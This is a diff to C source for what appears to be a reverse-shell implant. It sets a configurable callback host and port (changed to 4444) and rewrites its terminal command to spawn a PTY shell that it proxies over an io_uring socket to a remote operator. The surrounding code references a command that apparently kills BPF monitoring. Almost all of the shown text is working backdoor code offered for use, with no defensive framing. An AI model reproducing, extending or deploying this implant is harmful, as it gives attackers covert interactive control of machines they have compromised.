@@ -17,20 +17,14 @@
 #include <sys/wait.h>
 #include <stdint.h>
 #include <termios.h>
+#include <signal.h>
+#include <poll.h>
 
 #define SERVER_IP "127.0.0.1" //CHANGE THIS BRO
-#define SERVER_PORT 443 // RECOMMENDEED PORT 443
+#define SERVER_PORT 4444 // RECOMMENDEED PORT 443
 #define QUEUE_DEPTH 16
 #define BUF_SIZE 65536
 #define RECONNECT_TIME 5
-
-//macro to shorten code
-#define SUBMIT_READ(ring, fd, buf) do { \
-    struct io_uring_sqe *s = io_uring_get_sqe(ring); \
-    io_uring_prep_read(s, fd, buf, 8192, 0); \
-    io_uring_sqe_set_data(s, buf); \
-    io_uring_submit(ring); \
-} while (0)
 
 int send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) {
     size_t sent = 0;
@@ -642,114 +636,173 @@ void cmd_killbpf(struct io_uring *ring, int sockfd) {
     send_all(ring, sockfd, out, out_pos);
 }
 
-typedef enum { TAG_SOCK, TAG_PTY } cqe_tag;
+typedef enum { TAG_SOCK = 0, TAG_PTY = 1 } cqe_tag;
 
-#define SUBMIT_READ_TAGGED(ring, fd, buf, tag)                      \
-    do {                                                             \
-        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);          \
-        io_uring_prep_read(sqe, (fd), (buf), sizeof(buf), 0);       \
-        io_uring_sqe_set_data(sqe, (tag));                          \
-        io_uring_submit(ring);                                       \
-    } while (0)
+static int submit_poll(struct io_uring *ring, int fd, cqe_tag tag)
+{
+    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
+    if (!sqe) return -EBUSY;
+    io_uring_prep_poll_add(sqe, fd, POLLIN);
+    io_uring_sqe_set_data(sqe, (void *)(uintptr_t)tag);
+    return io_uring_submit(ring);
+}
 
-void cmd_terminal(struct io_uring *ring, int sockfd) {
+static int write_all(int fd, const char *buf, size_t len)
+{
+    while (len > 0) {
+        ssize_t w = write(fd, buf, len);
+        if (w < 0) {
+            if (errno == EINTR) continue;
+            return -1;
+        }
+        buf += w;
+        len -= w;
+    }
+    return 0;
+}
+
+static int drain_fd(int src_fd, int dst_fd, char *buf, size_t bufsz)
+{
+    for (;;) {
+        ssize_t n = read(src_fd, buf, bufsz);
+        if (n > 0) {
+            if (write_all(dst_fd, buf, (size_t)n) < 0) return -1;
+            continue;
+        }
+        if (n == 0)  return -1;
+        if (errno == EINTR) continue;
+        if (errno == EAGAIN || errno == EWOULDBLOCK) return 0;
+        return -1;
+    }
+}
+
+void cmd_terminal(struct io_uring *ring, int sockfd)
+{
     pid_t child;
     int master_fd;
-    char buf_sock[8192];
-    char buf_pty[8192];
+    char buf[8192];
 
-    if ((child = forkpty(&master_fd, NULL, NULL, NULL)) < 0) {
+    /* ------------------------------------------------------------------ */
+    /* 1. Spawn shell                                                      */
+    /* ------------------------------------------------------------------ */
+    child = forkpty(&master_fd, NULL, NULL, NULL);
+    if (child < 0) {
         write(sockfd, "pty spawn failed\n", 17);
         exit(1);
     }
-    if (!child) {
+    if (child == 0) {
+        struct termios ct;
+        if (tcgetattr(STDIN_FILENO, &ct) == 0) {
+            ct.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL | ICANON | ISIG | IEXTEN);
+            ct.c_iflag &= ~(ICRNL | IXON | ISTRIP);
+            ct.c_oflag &= ~OPOST;
+            ct.c_cc[VMIN]  = 1;
+            ct.c_cc[VTIME] = 0;
+            tcsetattr(STDIN_FILENO, TCSANOW, &ct);
+        }
         const char *sh = getenv("SHELL");
         if (!sh) sh = "/bin/sh";
         execlp(sh, sh, (char *)NULL);
         _exit(127);
     }
 
-    /* Disable PTY echo */
+    /* ------------------------------------------------------------------ */
+    /* 2. Master side: raw, nonblocking                                    */
+    /* ------------------------------------------------------------------ */
     struct termios t;
-    tcgetattr(master_fd, &t);
-    t.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL);
-    tcsetattr(master_fd, TCSANOW, &t);
-
-    /* master_fd blocking, sockfd nonblocking */
-    fcntl(sockfd, F_SETFL, fcntl(sockfd, F_GETFL, 0) | O_NONBLOCK);
-
-    /* Use a pipe to signal the PTY thread to wake the io_uring loop */
-    int pipefd[2];
-    pipe(pipefd);
-    fcntl(pipefd[0], F_SETFL, fcntl(pipefd[0], F_GETFL, 0) | O_NONBLOCK);
-
-    /* Spawn a dedicated thread to block-read the PTY and forward to socket */
-    struct pty_fwd_args {
-        int master_fd;
-        int sockfd;
-        struct io_uring *ring;
-    };
-
-    /* Instead of threads, use a simple select()-based loop since
-     * we don't actually need io_uring for a single terminal session */
-    fd_set rfds;
-    int maxfd = (master_fd > sockfd ? master_fd : sockfd) + 1;
-
-    /* Drain initial prompt */
-    struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 }; /* 50ms */
-    FD_ZERO(&rfds);
-    FD_SET(master_fd, &rfds);
-    if (select(master_fd + 1, &rfds, NULL, NULL, &tv) > 0) {
-        ssize_t n = read(master_fd, buf_pty, sizeof(buf_pty));
-        if (n > 0) send_all(ring, sockfd, buf_pty, (size_t)n);
+    if (tcgetattr(master_fd, &t) == 0) {
+        t.c_iflag &= ~(IGNBRK | BRKINT | PARMRK | ISTRIP
+                       | INLCR | IGNCR | ICRNL | IXON);
+        t.c_oflag &= ~OPOST;
+        t.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL | ICANON | ISIG | IEXTEN);
+        t.c_cflag &= ~(CSIZE | PARENB);
+        t.c_cflag |= CS8;
+        t.c_cc[VMIN]  = 0;
+        t.c_cc[VTIME] = 0;
+        tcsetattr(master_fd, TCSANOW, &t);
     }
 
-    while (1) {
-        FD_ZERO(&rfds);
-        FD_SET(sockfd, &rfds);
-        FD_SET(master_fd, &rfds);
+    fcntl(master_fd, F_SETFL, fcntl(master_fd, F_GETFL, 0) | O_NONBLOCK);
+    fcntl(sockfd,    F_SETFL, fcntl(sockfd,    F_GETFL, 0) | O_NONBLOCK);
 
-        if (select(maxfd, &rfds, NULL, NULL, NULL) < 0) {
-            if (errno == EINTR) continue;
+    /* ------------------------------------------------------------------ */
+    /* 3. Arm both polls and enter the pure proxy loop                     */
+    /* ------------------------------------------------------------------ */
+    if (submit_poll(ring, sockfd,    TAG_SOCK) < 0) goto done;
+    if (submit_poll(ring, master_fd, TAG_PTY)  < 0) goto done;
+
+    for (;;) {
+        struct io_uring_cqe *cqe;
+        int ret = io_uring_wait_cqe(ring, &cqe);
+        if (ret < 0) {
+            if (ret == -EINTR) continue;
             break;
         }
 
-        /* Data from client -> write to PTY */
-        if (FD_ISSET(sockfd, &rfds)) {
-            ssize_t n = recv(sockfd, buf_sock, sizeof(buf_sock), 0);
-            if (n <= 0) { shutdown(master_fd, SHUT_WR); break; }
+        cqe_tag tag = (cqe_tag)(uintptr_t)io_uring_cqe_get_data(cqe);
+        int     res = cqe->res;
+        io_uring_cqe_seen(ring, cqe);
 
-            for (ssize_t w = 0; w < n;) {
-                ssize_t r = write(master_fd, buf_sock + w, n - w);
-                if (r < 0) {
-                    if (errno == EINTR) continue;
-                    goto done;
-                }
-                w += r;
-            }
-
-            /* After writing command, wait for output before reading prompt */
-            usleep(10000); /* 10ms — give shell time to execute */
-
-            /* Drain all available PTY output for this command */
-            fcntl(master_fd, F_SETFL, fcntl(master_fd, F_GETFL, 0) | O_NONBLOCK);
-            ssize_t n2;
-            while ((n2 = read(master_fd, buf_pty, sizeof(buf_pty))) > 0) {
-                if (send_all(ring, sockfd, buf_pty, (size_t)n2) < 0) goto done;
-            }
-            fcntl(master_fd, F_SETFL, fcntl(master_fd, F_GETFL, 0) & ~O_NONBLOCK);
+        if (res < 0) {
+            if (res == -ECANCELED && tag == TAG_PTY)
+                drain_fd(master_fd, sockfd, buf, sizeof(buf));
+            break;
         }
 
-        /* PTY output -> forward to client (prompt, async output, etc.) */
-        if (FD_ISSET(master_fd, &rfds)) {
-            ssize_t n = read(master_fd, buf_pty, sizeof(buf_pty));
-            if (n <= 0) { shutdown(sockfd, SHUT_WR); break; }
-            if (send_all(ring, sockfd, buf_pty, (size_t)n) < 0) break;
+        if (tag == TAG_SOCK) {
+            /*
+             * Data from client: read it, write verbatim to PTY.
+             * The client is responsible for appending the sentinel
+             * command so it can detect when output is done:
+             *   e.g. client sends "ls\nprintf '\\x00DONE\\x00'\n"
+             */
+            ssize_t n = recv(sockfd, buf, sizeof(buf), 0);
+            if (n <= 0) {
+                if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
+                    if (submit_poll(ring, sockfd, TAG_SOCK) < 0) goto done;
+                    continue;
+                }
+                goto done;
+            }
+            if (write_all(master_fd, buf, (size_t)n) < 0) goto done;
+            if (submit_poll(ring, sockfd, TAG_SOCK) < 0) goto done;
+
+        } else {
+            /*
+             * PTY output: drain everything and forward to client.
+             * The client scans the byte stream for the sentinel and
+             * uses that to know the command finished.
+             */
+            if (drain_fd(master_fd, sockfd, buf, sizeof(buf)) < 0) goto done;
+            if (submit_poll(ring, master_fd, TAG_PTY) < 0) goto done;
         }
     }
 
 done:
-    if (child > 0) { kill(child, SIGHUP); waitpid(child, NULL, 0); }
+    {
+        struct io_uring_sqe *sqe;
+        sqe = io_uring_get_sqe(ring);
+        if (sqe) {
+            io_uring_prep_cancel(sqe, (void *)(uintptr_t)TAG_SOCK, 0);
+            io_uring_sqe_set_data(sqe, NULL);
+            io_uring_submit(ring);
+        }
+        sqe = io_uring_get_sqe(ring);
+        if (sqe) {
+            io_uring_prep_cancel(sqe, (void *)(uintptr_t)TAG_PTY, 0);
+            io_uring_sqe_set_data(sqe, NULL);
+            io_uring_submit(ring);
+        }
+        struct io_uring_cqe *cqe;
+        unsigned head, count = 0;
+        io_uring_for_each_cqe(ring, head, cqe) count++;
+        io_uring_cq_advance(ring, count);
+    }
+
+    if (child > 0) {
+        kill(child, SIGHUP);
+        waitpid(child, NULL, 0);
+    }
     close(master_fd);
     close(sockfd);
     exit(0);
